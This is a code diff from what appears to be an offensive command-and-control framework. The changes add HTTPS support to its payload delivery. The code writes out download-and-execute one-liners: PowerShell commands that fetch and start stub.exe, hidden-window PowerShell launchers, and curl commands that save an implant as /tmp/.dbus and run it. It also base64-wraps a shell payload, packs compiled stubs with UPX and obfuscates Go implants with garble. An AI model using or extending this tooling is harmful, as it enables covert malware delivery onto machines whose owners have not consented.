@@ -16,7 +16,6 @@ from collections.abc import Callable
 from contextlib import contextmanager
 from dataclasses import dataclass, field
 from datetime import datetime
-from string import Template
 from typing import Any
 
 from core.validators import check_lhost, check_lport
@@ -168,8 +167,12 @@ def _preflight(profile: C2Profile) -> bool:
 
 
 def _render_template(content: str, context: dict[str, Any]) -> str:
-    """Render a template using ``string.Template`` (safe substitution)."""
-    return Template(content).safe_substitute(context)
+    """Render a template by replacing {key} placeholders with context values."""
+    import re
+    def _replacer(match: re.Match) -> str:
+        key = match.group(1)
+        return str(context.get(key, match.group(0)))
+    return re.sub(r'\{([a-zA-Z_]\w*)\}', _replacer, content)
 
 
 @contextmanager
@@ -248,6 +251,7 @@ echo "Cloudflare Tunnel URL: $link"
             lhost = self.params["lhost"]
             lport = lport_param
 
+        rhost = self.params.get("rhost", lhost)
         rport = str(self.params["rport"])
         listener = str(self.params["listener"])
         sleep = str(self.params["sleep"])
@@ -263,6 +267,11 @@ echo "Cloudflare Tunnel URL: $link"
         random_bytes = os.urandom(100)
         random_string = base64.b64encode(random_bytes).decode("utf-8")[:12]
         working_dir = f"{path}/sessions/"
+
+        use_ssl = os.path.exists("cert.pem") and os.path.exists("key.pem")
+        protocol = "https" if use_ssl else "http"
+        curl_flags = "-k" if use_ssl else ""
+        psh_flags = " -SkipCertificateCheck" if use_ssl else ""
 
         if not choice:
             choice = (
@@ -286,14 +295,20 @@ echo "Cloudflare Tunnel URL: $link"
 
         if choice == "1":
             payload = (
-                f"powershell -c \"Invoke-WebRequest 'http://{lhost}/stub.exe' "
-                f"-OutFile 'stub.exe'; Start-Process 'stub.exe'\""
+                f"powershell -c \"Invoke-WebRequest '{protocol}://{lhost}:{lport}/s/stub.exe' "
+                f"-OutFile 'stub.exe'{psh_flags}; Start-Process 'stub.exe'\""
             )
             print_msg(payload)
             self.onecmd(f"encodewinbase64 {payload}")
             user_agent = user_agent_win
         elif choice == "2":
-            payload = f"""curl http://{lhost}/stub -o /tmp/stub && \
+            if use_ssl:
+                payload = (
+                    f"curl {curl_flags} {protocol}://{lhost}:{lport}/s/{line} -o /tmp/.dbus && "
+                    f"chmod +x /tmp/.dbus && /tmp/.dbus"
+                )
+            else:
+                payload = f"""curl {protocol}://{lhost}:{lport}/s/stub -o /tmp/stub && \
 [ -s /tmp/stub ] && \
 chmod +x /tmp/stub && \
 /tmp/stub""".replace("            ", "")
@@ -302,16 +317,16 @@ chmod +x /tmp/stub && \
             user_agent = user_agent_lin
         elif choice == "3":
             payload = (
-                f"powershell iwr -uri  http://{lhost}/batrat.bat -OutFile batrat.bat ; .\\batrat.bat"
+                f"powershell iwr -uri  {protocol}://{lhost}:{lport}/s/batrat.bat -OutFile batrat.bat{psh_flags} ; .\\batrat.bat"
             )
             copy2clip(payload)
             user_agent = user_agent_win
         elif choice == "4":
-            payload = f"curl http://{lhost}/r -o r && sh r"
+            payload = f"curl {curl_flags} {protocol}://{lhost}:{lport}/s/r -o r && sh r"
             copy2clip(payload)
             user_agent = user_agent_win
         elif choice in ("5", "6", "7"):
-            payload = f"curl http://{lhost}/r -o r && sh r"
+            payload = f"curl {curl_flags} {protocol}://{lhost}:{lport}/s/r -o r && sh r"
             copy2clip(payload)
             user_agent = user_agent_lin
         else:
@@ -327,15 +342,25 @@ chmod +x /tmp/stub && \
             return {}
 
         go_bin = _ensure_go(self.cmd)
-        if not is_binary_present("garble"):
-            self.cmd(f"{go_bin} install github.com/burrowers/garble@latest")
+        garble_installed = is_binary_present("garble") or (
+            os.path.isfile(os.path.expanduser("~/go/bin/garble"))
+        )
+        if not garble_installed:
+            self.cmd(f"{go_bin} install mvdan.cc/garble@latest")
+            self.cmd("sleep 2")
             garble_bin = shutil.which("garble") or os.path.expanduser("~/go/bin/garble")
-            gocompiler = f"{go_bin} build"
+            if os.path.isfile(garble_bin if isinstance(garble_bin, str) else str(garble_bin)):
+                gocompiler = f"{garble_bin} -literals -tiny build "
+            else:
+                gocompiler = f"{go_bin} build"
         else:
-            garble_bin = shutil.which("garble") or "garble"
+            garble_bin = shutil.which("garble") or os.path.expanduser("~/go/bin/garble")
             gocompiler = f"{garble_bin} -literals -tiny build "
 
         file = f"{path}/modules/run"
+        os.makedirs(f"{path}/sessions/win", exist_ok=True)
+        os.makedirs(f"{path}/sessions/lin", exist_ok=True)
+        os.makedirs(f"{path}/sessions/implant", exist_ok=True)
         wfile = f"{path}/sessions/win/lazybot.ps1"
         bfile = f"{path}/modules/run.bat"
         filek = f"{path}/modules/backdoor/backdoor.c"
@@ -373,6 +398,8 @@ chmod +x /tmp/stub && \
             "platform": platform,
             "sleep": sleep,
             "malleable": malleable,
+            "maleable": malleable,  # alias for Go source typo {maleable}
+            "protocol": protocol,
             "useragent": user_agent,
             "key": aes_key_hex,
             "stealth": "True",
@@ -386,14 +413,22 @@ chmod +x /tmp/stub && \
         }
 
         def _read(path_: str) -> str:
+            try:
+                with open(path_, "r") as f:
+                    return f.read()
+            except FileNotFoundError:
+                return ""
+
+        def _read_required(path_: str) -> str:
             with open(path_, "r") as f:
                 return f.read()
 
         def _write(path_: str, content: str) -> None:
+            os.makedirs(os.path.dirname(path_) or ".", exist_ok=True)
             with open(path_, "w+") as f:
                 f.write(content)
 
-        content = _render_template(_read(file), ctx)
+        content = _render_template(_read_required(file), ctx)
         wcontent = _render_template(_read(wfile), ctx)
         bcontent = _render_template(_read(bfile), ctx)
         cwcontent = _render_template(_read(cwfiles), ctx)
@@ -422,7 +457,7 @@ chmod +x /tmp/stub && \
         _write(f"sessions/listener_{line}.sh", listener_content)
 
         print_msg(
-            f"curl -o l_{line} http://{lhost}/listener_{line}.sh ; chmod +x l_{line}.sh ; ./l_{line}.sh &"
+            f"curl -o l_{line} {curl_flags} {protocol}://{lhost}:{lport}/s/listener_{line}.sh ; chmod +x l_{line}.sh ; ./l_{line}.sh &"
         )
 
         rcontent = _render_template(_read(filer), ctx)
@@ -495,12 +530,12 @@ chmod +x /tmp/stub && \
                 "cd sessions && base64 payload.sh | (echo -n '#!/bin/bash\\necho \"' ; cat - ; echo '\" | base64 -d | bash') | sponge payload.sh"
             )
             self.cmd(ofuscate)
-            curl_payload = f"curl -o payload.sh http://{lhost}/payload.sh ; chmod +x payload.sh ; ./payload.sh "
+            curl_payload = f"curl -o payload.sh {curl_flags} {protocol}://{lhost}:{lport}/s/payload.sh ; chmod +x payload.sh ; ./payload.sh "
             print_msg(curl_payload)
 
             with open("sessions/implant/stub_lin.c", "r") as f:
                 stub = f.read()
-            stub = _render_template(stub, {"lhost": lhost})
+            stub = _render_template(stub, {"lhost": lhost, "lport": lport})
             _write("sessions/stub.c", stub)
             self.cmd("gcc -o sessions/stub sessions/stub.c -lcurl && upx sessions/stub")
 
@@ -508,17 +543,17 @@ chmod +x /tmp/stub && \
             compile_cw = f"x86_64-w64-mingw32-gcc -o sessions/b{line}.exe sessions/wmr.c -lws2_32 -lwininet"
             command_mrhyde = f"x86_64-w64-mingw32-gcc -shared -o {path}/sessions/mrhyde.dll {path}/sessions/mrhydew.c -lkernel32 -luser32 -ladvapi32"
             print_msg(
-                f'Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"iwr -uri  http://{lhost}/{implant_go} -OutFile {implant_go} ; .\\{implant_go}`""'
+                f'Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"iwr -uri  {protocol}://{lhost}:{lport}/s/{implant_go} -OutFile {implant_go}{psh_flags} ; .\\{implant_go}`""'
             )
             print_msg(
-                f'Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"iwr -uri  http://{lhost}/{implant_go2} -OutFile {implant_go2} ; .\\{implant_go2}`""'
+                f'Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"iwr -uri  {protocol}://{lhost}:{lport}/s/{implant_go2} -OutFile {implant_go2}{psh_flags} ; .\\{implant_go2}`""'
             )
             print_msg(
-                f'Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"iwr -uri  http://{lhost}/b{line}.exe -OutFile b{line}.exe ; .\\b{line}.exe`""'
+                f'Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"iwr -uri  {protocol}://{lhost}:{lport}/s/b{line}.exe -OutFile b{line}.exe{psh_flags} ; .\\b{line}.exe`""'
             )
             with open("sessions/implant/stub.c", "r") as f:
                 stub = f.read()
-            stub = _render_template(stub, {"lhost": lhost})
+            stub = _render_template(stub, {"lhost": lhost, "lport": lport})
             _write("sessions/stub.c", stub)
             self.cmd(
                 "x86_64-w64-mingw32-gcc -o sessions/stub.exe sessions/stub.c -lwininet -ladvapi32 -s -Os -static -fno-stack-protector -lcrypt32 && upx sessions/stub.exe"
@@ -585,14 +620,14 @@ with open('sessions/beacon.enc', 'wb') as f:
             "id": random_string,
             "name": line,
             "binary": f"{path}/sessions/{binary}",
-            "url_binary": f"http://{lhost}/{binary}",
+            "url_binary": f"{protocol}://{lhost}:{lport}/s/{binary}",
             "os_id": choice,
             "os": platform,
             "rhost": self.params["rhost"],
             "log": f"{line}.log",
             "user_agent": user_agent,
             "malleable_route": malleable,
-            "url": f"https://{lhost}:{lport}",
+            "url": f"{protocol}://{lhost}:{lport}",
             "sleep": sleep,
             "username": self.c2_user,
             "password": self.c2_pass,
@@ -610,16 +645,24 @@ with open('sessions/beacon.enc', 'wb') as f:
         else:
             with open(json_file, "r") as f:
                 short_urls = json.load(f)
-        if line in short_urls:
-            print_warn(f"Entry '{line}' already exists in short urls")
-        short_urls[line] = {
-            "original_url": f"https://{lhost}/s/{binary}",
-            "active": True,
-            "created_at": datetime.now().isoformat(),
+
+        _payloads_to_register = {
+            line: f"/s/{binary}",
+            "stub": "/s/stub",
+            "beacon.enc": "/s/beacon.enc",
+            "r": "/s/r",
         }
+        for short_name, target_path in _payloads_to_register.items():
+            if short_name in short_urls:
+                print_warn(f"Entry '{short_name}' already exists in short urls")
+            short_urls[short_name] = {
+                "original_url": f"{protocol}://{lhost}{target_path}",
+                "active": True,
+                "created_at": datetime.now().isoformat(),
+            }
         with open(json_file, "w") as f:
             json.dump(short_urls, f, indent=2)
-        print_msg(f"Created new entry for '{line}' in shorts urls")
+        print_msg(f"Created entries in shorts urls")
 
         # --- C2 server ---
         self.onecmd("create_session_json")
@@ -633,7 +676,7 @@ with open('sessions/beacon.enc', 'wb') as f:
         )
 
         result = {
-            "c2_url": f"https://{lhost}:{lport}",
+            "c2_url": f"{protocol}://{lhost}:{lport}",
             "c2_clientid": line.strip(),
             "c2_auth": (self.c2_user, self.c2_pass),
             "lhost": lhost,
